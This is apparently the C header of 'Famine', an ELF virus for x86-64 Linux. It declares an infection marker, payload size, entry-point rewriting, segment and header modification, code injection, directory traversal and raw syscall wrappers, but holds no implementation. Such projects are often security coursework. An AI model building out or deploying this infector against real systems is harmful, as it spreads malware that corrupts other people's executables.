#ifndef FAMINE_H
#define FAMINE_H

////////////////////////////////////////////////////////////////////////////////
/// INCLUDES 
////////////////////////////////////////////////////////////////////////////////

#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <sys/mman.h>
#include <elf.h>

////////////////////////////////////////////////////////////////////////////////
/// DEFINES
////////////////////////////////////////////////////////////////////////////////

#define INFECTED_MAGIC_NUMBER 0x15D2
#define ELF_MAGIC_SIZE 4
#define ELF_MAGIC_NUMBER 1179403647
#define X86_64 2

#define PAYLOAD_SIZE 105

#define BUFF_SIZE 1024 * 1024

#define ROOT_SIZE 4
#define USER_SIZE 2

#define CRITERIA_SIZE 4

#define FALSE 0
#define TRUE 1

////////////////////////////////////////////////////////////////////////////////
/// STRUCTURES
////////////////////////////////////////////////////////////////////////////////

struct linux_dirent64
{
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

struct directory
{
	char path[PATH_MAX];
	unsigned long entry;
};

struct s_info
{
	int fd;
	void *ptr;
	unsigned long size;

	Elf64_Phdr *note;
	Elf64_Phdr *data;
	
	unsigned int old_entry;
	unsigned int new_entry;
};

struct criteria
{
	char (*fct)(const Elf64_Ehdr *header);
};

////////////////////////////////////////////////////////////////////////////////
/// PROTOTYPES 
////////////////////////////////////////////////////////////////////////////////

// FAMINE
void constructor(void);
__attribute__((hot)) void famine(const char *file, const unsigned long m_entry, const int trace);
void modify_segment(struct s_info *info);
void modify_header(struct s_info *info, Elf64_Ehdr *header);
void inject(const struct s_info *info, const unsigned long m_entry, const int trace);
void test(void);

// INFO
struct s_info get_info(const char *str);
void release_info(struct s_info *info);

// LIB
int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int _close(int fd);
int _open(const char *pathname, int flags, long mode);
void *_mmap(void *addr, unsigned long length,  unsigned long prot, unsigned long flags, unsigned long fd, unsigned long offset);
int _munmap(void *addr, unsigned long length);
int _getuid(void);
int _stat(const char *pathname, struct stat *statbuf);
int _write(int fd, const void *buf, long count);
unsigned long _get_random_integer(const unsigned long range);
unsigned long _strlen(const char *str);
void _bzero(char *str, const unsigned long size);
void _memcpy(void *dst, void const *src, const unsigned long size);
void Exit(int status);

// DIRENT

__attribute__((hot)) void update_dirent(char *dirent, const char *path);
__attribute__((hot)) void update_directory(struct directory *dir, const char *dirent);

#endif
